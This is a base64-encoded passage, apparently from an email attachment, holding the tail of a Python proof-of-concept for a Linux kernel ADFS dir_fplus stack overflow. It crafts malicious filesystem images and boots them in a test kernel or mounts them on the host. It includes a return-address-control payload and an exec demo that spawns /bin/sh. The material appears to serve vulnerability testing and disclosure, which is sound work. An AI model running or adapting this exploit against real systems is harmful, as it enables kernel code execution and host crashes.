Y3V0aW5nIC0tLSc7ICIKICAgICAgICAibHMgLWxhIC0tY29sb3I9bmV2ZXIgL2hvbWUvbG9jYWxo
b3N0L2xpbnV4L2Z1enotd29ya3NwYWNlL3BvYyAyPi9kZXYvbnVsbCB8IGhlYWQgLW4gODsgIgog
ICAgICAgICJlY2hvICctLS0gdW5hbWUgLS0tJzsgdW5hbWUgLXNybSIKICAgICkKICAgIHIgPSBz
dWJwcm9jZXNzLnJ1bihbc2gsICItYyIsIHNjcmlwdF0sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRl
eHQ9VHJ1ZSkKICAgIHN5cy5zdGRvdXQud3JpdGUoci5zdGRvdXQpCiAgICBpZiByLnJldHVybmNv
ZGUgIT0gMCBhbmQgci5zdGRlcnIuc3RyaXAoKToKICAgICAgICBwcmludChmIltzdGRlcnJdIHty
LnN0ZGVyci5zdHJpcCgpfSIpCgogICAgcHJpbnQoIlxuIyMjIDQuIHJhdyBleGVjdmUoKTogYSBj
aGlsZCByZXBsYWNlcyBpdHMgb3duIHByb2Nlc3MgaW1hZ2Ugd2l0aCAvYmluL3NoIikKICAgIHN5
cy5zdGRvdXQuZmx1c2goKQogICAgc3lzLnN0ZGVyci5mbHVzaCgpCiAgICBwaWQgPSBvcy5mb3Jr
KCkKICAgIGlmIHBpZCA9PSAwOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMg
Y2hpbGQKICAgICAgICBzeXMuc3RkZXJyLndyaXRlKGYiW2NoaWxkIHBpZCB7b3MuZ2V0cGlkKCl9
XSBpbWFnZSBpcyBweXRob24gLT4gY2FsbGluZyBleGVjdmUoe3NofSlcbiIpCiAgICAgICAgc3lz
LnN0ZGVyci5mbHVzaCgpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5leGVjdihzaCwgW3No
LCAiLWMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICJlY2hvICdbZXhlY3ZlIE9LXSBjaGls
ZCBpbWFnZSBpcyBub3cgL2Jpbi9zaCc7ICIKICAgICAgICAgICAgICAgICAgICAgICAgICAiZWNo
byBcInBpZD0kJCB1aWQ9JChpZCAtdSlcIjsgdW5hbWUgLWEiXSkKICAgICAgICBleGNlcHQgT1NF
cnJvciBhcyBlOgogICAgICAgICAgICBzeXMuc3RkZXJyLndyaXRlKGYiW2NoaWxkXSBleGVjdmUg
RkFJTEVEOiB7ZX1cbiIpCiAgICAgICAgICAgIG9zLl9leGl0KDEyNykKICAgIGVsc2U6ICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcGFyZW50CiAgICAgICAgXywg
c3RhdHVzID0gb3Mud2FpdHBpZChwaWQsIDApCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjb2Rl
ID0gb3Mud2FpdHN0YXR1c190b19leGl0Y29kZShzdGF0dXMpCiAgICAgICAgZXhjZXB0IEF0dHJp
YnV0ZUVycm9yOiAgICAgICAgICAgICAgICAgICAgICAjIHB5IDwgMy45CiAgICAgICAgICAgIGNv
ZGUgPSAoc3RhdHVzID4+IDgpIGlmIG9zLldJRkVYSVRFRChzdGF0dXMpIGVsc2UgLW9zLldURVJN
U0lHKHN0YXR1cykKICAgICAgICBwcmludChmIltwYXJlbnRdIGNoaWxkIHtwaWR9IGV4aXRlZCBj
b2RlPXtjb2RlfSAgKDAgPT0gL2Jpbi9zaCBFTEYgbG9hZGVkICYgcmFuKSIpCgogICAgcHJpbnQo
IlxuWytdIENvbmZpcm1hdGlvbjogZXhlYygpIGxvYWRlZCB0aGUgRUxGIGJpbmFyaWVzIGFuZCB0
aGV5IGV4ZWN1dGVkLiBEb25lLiIpCiAgICByZXR1cm4gMAoKCiMgPT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
CiMgNS4gbWFpbgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKZGVmIG1haW4oKToKICAgIGFwID0gYXJn
cGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IlRlc3QvZGV0ZWN0IHRoZSBBREZTIGRp
cl9mcGx1cyBzdGFjayBvdmVyZmxvdy4iKQogICAgYXAuYWRkX2FyZ3VtZW50KCItLW1vZGUiLCBj
aG9pY2VzPSgidW1sIiwgImhvc3QiKSwgZGVmYXVsdD0idW1sIikKICAgIGFwLmFkZF9hcmd1bWVu
dCgiLS1rZXJuZWwiLCBkZWZhdWx0PSIvaG9tZS9sb2NhbGhvc3QvbGludXgvZnV6ei13b3Jrc3Bh
Y2Uvc3JjL2xpbnV4LTcuMC4xL2xpbnV4IikKICAgIGFwLmFkZF9hcmd1bWVudCgiLS1pbml0cmFt
ZnMiLCBkZWZhdWx0PSIvaG9tZS9sb2NhbGhvc3QvbGludXgvZnV6ei13b3Jrc3BhY2UvcG9jL2lu
aXRyYW1mcy5jcGlvLmd6IikKICAgIGFwLmFkZF9hcmd1bWVudCgiLS1pbWFnZSIsIGRlZmF1bHQ9
Tm9uZSwgaGVscD0ib3V0cHV0IGltYWdlIHBhdGggKGRlZmF1bHQ6IHRlbXApIikKICAgIGFwLmFk
ZF9hcmd1bWVudCgiLS1vdmVyZmxvdy1sZW4iLCB0eXBlPWludCwgZGVmYXVsdD01MTIsCiAgICAg
ICAgICAgICAgICAgICAgaGVscD0iYmlnZGlyb2JuYW1lbGVuIHRvIHBsYW50ICg+MjYwKTsgZGVm
YXVsdCA1MTIiKQogICAgYXAuYWRkX2FyZ3VtZW50KCItLW5hbWUtZmlsbCIsIHR5cGU9bGFtYmRh
IHM6IGludChzLCAwKSwgZGVmYXVsdD0weDQxLAogICAgICAgICAgICAgICAgICAgIGhlbHA9ImJ5
dGUgcGxhbnRlZCBhcyBuYW1lIGNvbnRlbnQgKGRlZmF1bHQgMHg0MSkiKQogICAgYXAuYWRkX2Fy
Z3VtZW50KCItLXJpcCIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICAgICAgICAgICAgICAgICAg
aGVscD0idXNlIHRoZSBSSVAtY29udHJvbCBwYXlsb2FkOiBhIDM4OC1ieXRlIHRyaW1tZWQgb3Zl
cmZsb3cgdGhhdCAiCiAgICAgICAgICAgICAgICAgICAgICAgICAibGFuZHMgYSBjb250cm9sbGVk
IDgtYnl0ZSB2YWx1ZSBvbiBhZGZzX2ZwbHVzX2l0ZXJhdGUncyBzYXZlZCAiCiAgICAgICAgICAg
ICAgICAgICAgICAgICAicmV0dXJuIGFkZHJlc3MgKG5vIHN0YWNrIGNhbmFyeSBpbiB0aGlzIGJ1
aWxkIC0+IHJldCByZWRpcmVjdHMpIikKICAgIGFwLmFkZF9hcmd1bWVudCgiLS1yaXAtdmFsdWUi
LCB0eXBlPWxhbWJkYSBzOiBpbnQocywgMCksCiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdD0w
eGZmZmZmZmZmNDM0MzQzNDMsCiAgICAgICAgICAgICAgICAgICAgaGVscD0idmFsdWUgcGxhbnRl
ZCBhcyB0aGUgc2F2ZWQgcmV0dXJuIGFkZHJlc3MgKGRlZmF1bHQgIgogICAgICAgICAgICAgICAg
ICAgICAgICAgIjB4ZmZmZmZmZmY0MzQzNDM0MywgY2Fub25pY2FsIC0+IHJldCBjb21wbGV0ZXMg
dG8gdGhpcyBJUDsgIgogICAgICAgICAgICAgICAgICAgICAgICAgInVzZSAweDQyNDI0MjQyNDI0
MjQyNDIgZm9yIGEgbm9uLWNhbm9uaWNhbCBmYXVsdC1hdC1yZXQgZGVtbykiKQogICAgYXAuYWRk
X2FyZ3VtZW50KCItLWV4ZWMtZGVtbyIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIsCiAgICAgICAgICAg
ICAgICAgICAgaGVscD0iZG9uJ3QgdGVzdCB0aGUgdnVsbjogdmlzdWFsbHkgZGVtb25zdHJhdGUg
RUxGIGV4ZWN1dGlvbiBieSAiCiAgICAgICAgICAgICAgICAgICAgICAgICAidHJpZ2dlcmluZyBl
eGVjKCkgb24gL2Jpbi9zaCAoYW5kIGxzKSBmb3IgY29uZmlybWF0aW9uIikKICAgIGFwLmFkZF9h
cmd1bWVudCgiLS1zaCIsIGRlZmF1bHQ9Ii9iaW4vc2giLCBoZWxwPSJzaGVsbCBFTEYgdG8gZXhl
YyAoZGVmYXVsdCAvYmluL3NoKSIpCiAgICBhcC5hZGRfYXJndW1lbnQoIi0tdGltZW91dCIsIHR5
cGU9aW50LCBkZWZhdWx0PTQwLCBoZWxwPSJVTUwgdGltZW91dCAocykiKQogICAgYXAuYWRkX2Fy
Z3VtZW50KCItLWNyYWZ0LW9ubHkiLCBhY3Rpb249InN0b3JlX3RydWUiLAogICAgICAgICAgICAg
ICAgICAgIGhlbHA9ImJ1aWxkICsgc2FuaXR5LWNoZWNrIHRoZSBpbWFnZSwgZG9uJ3QgYm9vdC9t
b3VudCIpCiAgICBhcC5hZGRfYXJndW1lbnQoIi0taS1rbm93LXRoaXMtbWF5LWNyYXNoLXRoZS1o
b3N0IiwgYWN0aW9uPSJzdG9yZV90cnVlIiwKICAgICAgICAgICAgICAgICAgICBoZWxwPSJyZXF1
aXJlZCBnYXRlIGZvciAtLW1vZGUgaG9zdCIpCiAgICBhcC5hZGRfYXJndW1lbnQoIi12IiwgIi0t
dmVyYm9zZSIsIGFjdGlvbj0ic3RvcmVfdHJ1ZSIpCiAgICBhcmdzID0gYXAucGFyc2VfYXJncygp
CgogICAgaWYgYXJncy5leGVjX2RlbW86CiAgICAgICAgcmV0dXJuIGV4ZWNfZGVtbyhhcmdzLnNo
KQoKICAgIGtlZXBfaW1hZ2UgPSBib29sKGFyZ3MuaW1hZ2UpCiAgICBpbWFnZSA9IGFyZ3MuaW1h
Z2Ugb3Igb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImFkZnNfdGVzdC5pbWci
KQoKICAgIGF0dHIgPSAweDMzCiAgICByZXRfb2Zmc2V0ID0gTm9uZQogICAgcmV0X3ZhbHVlID0g
Tm9uZQogICAgaWYgYXJncy5yaXA6CiAgICAgICAgYXJncy5vdmVyZmxvd19sZW4gPSAzODgKICAg
ICAgICBhdHRyID0gMHgzYgogICAgICAgIHJldF9vZmZzZXQgPSAzODAKICAgICAgICByZXRfdmFs
dWUgPSBhcmdzLnJpcF92YWx1ZQogICAgICAgIHByaW50KGYiWypdIFJJUC1DT05UUk9MIHBheWxv
YWQ6IG92ZXJmbG93X2xlbj0zODgsIGF0dHI9MHh7YXR0cjowMnh9LCAiCiAgICAgICAgICAgICAg
ZiJzYXZlZC1yZXQgQG5hbWVbe3JldF9vZmZzZXR9Li57cmV0X29mZnNldCs4fSkgPSAweHtyZXRf
dmFsdWU6MDE2eH0iKQogICAgcHJpbnQoZiJbKl0gY3JhZnRpbmcgQURGUyBGKyBpbWFnZSAoYmln
ZGlyb2JuYW1lbGVuPXthcmdzLm92ZXJmbG93X2xlbn0sICIKICAgICAgICAgIGYiZmlsbD0weHth
cmdzLm5hbWVfZmlsbDowMnh9LCBhdHRyPTB4e2F0dHI6MDJ4fSkgLT4ge2ltYWdlfSIpCiAgICBk
YXRhID0gYnVpbGRfYWRmc19pbWFnZShhcmdzLm92ZXJmbG93X2xlbiwgYXJncy5uYW1lX2ZpbGws
IGF0dHI9YXR0ciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldF9vZmZzZXQ9cmV0X29m
ZnNldCwgcmV0X3ZhbHVlPXJldF92YWx1ZSkKICAgIHNhbml0eV9jaGVja19pbWFnZShkYXRhLCBh
cmdzLm92ZXJmbG93X2xlbikKICAgIHdpdGggb3BlbihpbWFnZSwgIndiIikgYXMgZjoKICAgICAg
ICBmLndyaXRlKGRhdGEpCiAgICBwcmludChmIlsqXSBpbWFnZSBPSyAoe2xlbihkYXRhKX0gYnl0
ZXMpIikKCiAgICBpZiBhcmdzLmNyYWZ0X29ubHk6CiAgICAgICAgcHJpbnQoIlsrXSAtLWNyYWZ0
LW9ubHk6IGltYWdlIGJ1aWx0IGFuZCBzdHJ1Y3R1cmFsbHkgdmFsaWQuICIKICAgICAgICAgICAg
ICAiQm9vdCBpdCB1bmRlciBhIEtBU0FOL0FERlMga2VybmVsIHRvIHRyaXAgdGhlIG92ZXJmbG93
LiIpCiAgICAgICAgcmV0dXJuIDAKCiAgICBpZiBhcmdzLm1vZGUgPT0gImhvc3QiOgogICAgICAg
IGlmIG5vdCBhcmdzLmlfa25vd190aGlzX21heV9jcmFzaF90aGVfaG9zdDoKICAgICAgICAgICAg
cHJpbnQoIlshXSAtLW1vZGUgaG9zdCBjYW4gUEFOSUMvQ09SUlVQVCB0aGUgcnVubmluZyBrZXJu
ZWwuICIKICAgICAgICAgICAgICAgICAgIlBhc3MgLS1pLWtub3ctdGhpcy1tYXktY3Jhc2gtdGhl
LWhvc3QgdG8gcHJvY2VlZC4iLCBmaWxlPXN5cy5zdGRlcnIpCiAgICAgICAgICAgIHJldHVybiAy
CiAgICAgICAgbW50ID0gdGVtcGZpbGUubWtkdGVtcChwcmVmaXg9ImFkZnNfaG9zdF8iKQogICAg
ICAgIHRyeToKICAgICAgICAgICAgaW5mbywgZG1lc2cgPSBydW5faG9zdChpbWFnZSwgbW50KQog
ICAgICAgICAgICBwcmludChpbmZvKQogICAgICAgICAgICBwcmludCgiLS0tLSBkbWVzZyAodGFp
bCkgLS0tLSIpCiAgICAgICAgICAgIHByaW50KGRtZXNnKQogICAgICAgICAgICBzaWcgPSBwYXJz
ZV9vdXRwdXQoZG1lc2cgKyAiXG4iICsgaW5mbykKICAgICAgICAgICAgaWYgInN0YWNrLW91dC1v
Zi1ib3VuZHMiIGluIGRtZXNnIG9yIHNpZ1sia2FzYW4iXSBvciBcCiAgICAgICAgICAgICAgICJf
X3N0YWNrX2Noa19mYWlsIiBpbiBkbWVzZyBvciAiYWRmcyIgaW4gZG1lc2cgYW5kIFwKICAgICAg
ICAgICAgICAgKCJCVUciIGluIGRtZXNnIG9yICJwYW5pYyIgaW4gZG1lc2cubG93ZXIoKSk6CiAg
ICAgICAgICAgICAgICBwcmludCgiXG5bK10gUkVTVUxUOiBWVUxORVJBQkxFIOKAlCBob3N0IGtl
cm5lbCB0cmlwcGVkIHRoZSBvdmVyZmxvdy4iKQogICAgICAgICAgICAgICAgcmV0dXJuIDEKICAg
ICAgICAgICAgcHJpbnQoIlxuWy1dIFJFU1VMVDogbm8gY2xlYXIgdHJpcCBzaWduYWwgaW4gZG1l
c2cgIgogICAgICAgICAgICAgICAgICAiKGtlcm5lbCBtYXkgYmUgcGF0Y2hlZCwgbm9uLUtBU0FO
LCBvciB0aGUgb3ZlcmZsb3cgd2FzIHNpbGVudCkuIikKICAgICAgICAgICAgcmV0dXJuIDAKICAg
ICAgICBmaW5hbGx5OgogICAgICAgICAgICBzaHV0aWwucm10cmVlKG1udCwgaWdub3JlX2Vycm9y
cz1UcnVlKQogICAgICAgICAgICBpZiBub3Qga2VlcF9pbWFnZToKICAgICAgICAgICAgICAgIHRy
eTogb3MucmVtb3ZlKGltYWdlKQogICAgICAgICAgICAgICAgZXhjZXB0IE9TRXJyb3I6IHBhc3MK
CiAgICAjIC0tLS0gVU1MIG1vZGUgKGRlZmF1bHQpIC0tLS0KICAgIGxvZ19wYXRoID0gb3MucGF0
aC5qb2luKG9zLnBhdGguZGlybmFtZShvcy5wYXRoLmFic3BhdGgoaW1hZ2UpKSwgInRlc3RfYWRm
c191bWwubG9nIikKICAgIHByaW50KGYiWypdIGJvb3RpbmcgVU1ML0tBU0FOIGtlcm5lbDoge2Fy
Z3Mua2VybmVsfSIpCiAgICBwcmludChmIlsqXSBpbml0cmFtZnM6IHthcmdzLmluaXRyYW1mc30i
KQogICAgdHJ5OgogICAgICAgIG91dCwgcmMsIHRpbWVkX291dCA9IHJ1bl91bWwoYXJncy5rZXJu
ZWwsIGFyZ3MuaW5pdHJhbWZzLCBpbWFnZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIHRpbWVvdXQ9YXJncy50aW1lb3V0LCBsb2dfcGF0aD1sb2dfcGF0aCkKICAgIGV4Y2Vw
dCBGaWxlTm90Rm91bmRFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYiWyFdIHtlfSIsIGZpbGU9
c3lzLnN0ZGVycikKICAgICAgICByZXR1cm4gMgogICAgcHJpbnQoZiJbKl0gVU1MIGZpbmlzaGVk
IChyYz17cmN9LCB0aW1lZF9vdXQ9e3RpbWVkX291dH0pOyBsb2cgLT4ge2xvZ19wYXRofSIpCgog
ICAgc2lnID0gcGFyc2Vfb3V0cHV0KG91dCkKCiAgICBpZiBub3Qgc2lnWyJtb3VudF9vayJdOgog
ICAgICAgIHByaW50KCJbIV0gRVJST1I6IGltYWdlIGRpZCBub3QgbW91bnQgKGFkZnMgdW5zdXBw
b3J0ZWQgaW4gdGhpcyBrZXJuZWwsICIKICAgICAgICAgICAgICAib3IgaW1hZ2UgcmVqZWN0ZWQp
LiBDYW5ub3QgZGV0ZXJtaW5lLiIpCiAgICAgICAgaWYgYXJncy52ZXJib3NlOgogICAgICAgICAg
ICBwcmludChvdXRbLTE1MDA6XSkKICAgICAgICByZXR1cm4gMgoKICAgIHJpcCA9IHBhcnNlX3Jp
cChvdXQsIGFyZ3MucmlwX3ZhbHVlKSBpZiBhcmdzLnJpcCBlbHNlIE5vbmUKCiAgICB2dWxuZXJh
YmxlID0gc2lnWyJrYXNhbiJdIGFuZCBzaWdbImFkZnNfaGl0cyJdCiAgICBpZiBub3QgdnVsbmVy
YWJsZSBhbmQgKHNpZ1sicGFuaWMiXSBvciBzaWdbImNvbnRyb2xsZWQiXSkgYW5kIHNpZ1siYWRm
c19oaXRzIl06CiAgICAgICAgIyBOb24tS0FTQU4gYnVpbGQ6IGNyYXNoL2NvbnRyb2xsZWQtY29u
dGVudCBpbiB0aGUgYWRmcyBwYXRoIHN0aWxsIGNvdW50cy4KICAgICAgICB2dWxuZXJhYmxlID0g
VHJ1ZQogICAgcmlwX2NvbnRyb2wgPSBib29sKHJpcCBhbmQgKHJpcFsiY2Fub25pY2FsX2hpdCJd
IG9yIHJpcFsicmV0X2ZhdWx0Il0pKQoKICAgIHByaW50KCJcbj09PT0gREVURUNUSU9OIFNJR05B
TFMgPT09PSIpCiAgICBmb3IgaywgdiBpbiBzaWcuaXRlbXMoKToKICAgICAgICBwcmludChmIiAg
e2s6MTF9ID0ge3Z9IikKICAgIGlmIHJpcDoKICAgICAgICBmb3IgaywgdiBpbiByaXAuaXRlbXMo
KToKICAgICAgICAgICAgcHJpbnQoZiIgIHtrOjEzfSA9IHt2fSIpCgogICAgaWYgcmlwX2NvbnRy
b2w6CiAgICAgICAgaWYgcmlwWyJjYW5vbmljYWxfaGl0Il06CiAgICAgICAgICAgIHByaW50KGYi
XG5bK10gUkVTVUxUOiBSSVAgQ09OVFJPTCBERU1PTlNUUkFURUQg4oCUIGByZXRgIGNvbXBsZXRl
ZCB0byB0aGUgIgogICAgICAgICAgICAgICAgICBmImF0dGFja2VyIHZhbHVlIDB4e2FyZ3Mucmlw
X3ZhbHVlOjAxNnh9IChmYXVsdGluZyBJUCA9PSBwbGFudGVkIHZhbHVlKS4iKQogICAgICAgICAg
ICBwcmludCgiICAgID0+IGFyYml0cmFyeSBrZXJuZWwgaW5zdHJ1Y3Rpb24tcG9pbnRlciBjb250
cm9sIG9uIHRoaXMgIgogICAgICAgICAgICAgICAgICAidW4tY2FuYXJpZWQgYnVpbGQ6IGEgY29k
ZS1leGVjdXRpb24gcHJpbWl0aXZlLiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQo
ZiJcblsrXSBSRVNVTFQ6IFJJUCBDT05UUk9MIChub24tY2Fub25pY2FsKSDigJQgYHJldGAgcmVh
ZCB0aGUgIgogICAgICAgICAgICAgICAgICBmImF0dGFja2VyIHZhbHVlIDB4e2FyZ3MucmlwX3Zh
bHVlOjAxNnh9IG9mZiB0aGUgc3RhY2sgYW5kIGZhdWx0ZWQuIikKICAgICAgICBpZiBhcmdzLnZl
cmJvc2U6CiAgICAgICAgICAgIHByaW50KCJcbi0tLS0gZXZpZGVuY2UgLS0tLVxuIiArIGV2aWRl
bmNlX2V4Y2VycHQob3V0KSkKICAgICAgICByZXR1cm4gMQoKICAgIGlmIHZ1bG5lcmFibGU6CiAg
ICAgICAgcHJpbnQoIlxuWytdIFJFU1VMVDogVlVMTkVSQUJMRSDigJQgY29uZmlybWVkIEFERlMg
ZGlyX2ZwbHVzIHN0YWNrIG92ZXJmbG93LiIpCiAgICAgICAgaWYgc2lnWyJrYXNhbiJdOgogICAg
ICAgICAgICBwcmludCgiICAgIEtBU0FOIHN0YWNrLW91dC1vZi1ib3VuZHMgaW46IiwgIiwgIi5q
b2luKHNpZ1siYWRmc19oaXRzIl0pKQogICAgICAgIGlmIHNpZ1siY29udHJvbGxlZCJdOgogICAg
ICAgICAgICBwcmludCgiICAgIGF0dGFja2VyLWNvbnRyb2xsZWQgbmFtZSBieXRlcyByZWFjaGVk
IHJlZ2lzdGVycyAtPiAiCiAgICAgICAgICAgICAgICAgICJzdGFjayBjb250ZW50IGlzIGF0dGFj
a2VyLWluZmx1ZW5jZWQuIikKICAgICAgICBpZiBhcmdzLnZlcmJvc2U6CiAgICAgICAgICAgIHBy
aW50KCJcbi0tLS0gZXZpZGVuY2UgLS0tLVxuIiArIGV2aWRlbmNlX2V4Y2VycHQob3V0KSkKICAg
ICAgICByZXR1cm4gMQoKICAgIGlmIHNpZ1sibW91bnRfb2siXSBhbmQgbm90IChzaWdbImthc2Fu
Il0gb3Igc2lnWyJwYW5pYyJdKToKICAgICAgICBwcmludCgiXG5bLV0gUkVTVUxUOiBOTyBTSUdO
QUwuIEltYWdlIG1vdW50ZWQgY2xlYW5seSB3aXRoIG5vIEtBU0FOIHRyaXAgLyBwYW5pYy4iKQog
ICAgICAgIHByaW50KCIgICAgTGlrZWx5IGNhdXNlczogdGhlIGtlcm5lbCBpcyBQQVRDSEVELCBv
ciBhIG5vbi1LQVNBTiBidWlsZCB3aGVyZSB0aGUgIgogICAgICAgICAgICAgICJvdmVyZmxvdyB3
YXMgc2lsZW50IChubyBkZWZpbml0aXZlIGFuc3dlciB3aXRob3V0IEtBU0FOKS4iKQogICAgICAg
IHJldHVybiAwCgogICAgcHJpbnQoIlxuWz9dIFJFU1VMVDogSU5DT05DTFVTSVZFIChtb3VudGVk
LCBzb21lIHNpZ25hbHMgYnV0IG5vIGRlZmluaXRpdmUgdHJpcCkuIikKICAgIGlmIGFyZ3MudmVy
Ym9zZToKICAgICAgICBwcmludChldmlkZW5jZV9leGNlcnB0KG91dCkpCiAgICByZXR1cm4gMAoK
CmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBzeXMuZXhpdChtYWluKCkpCg==
--0000000000000542c90657f2e235--
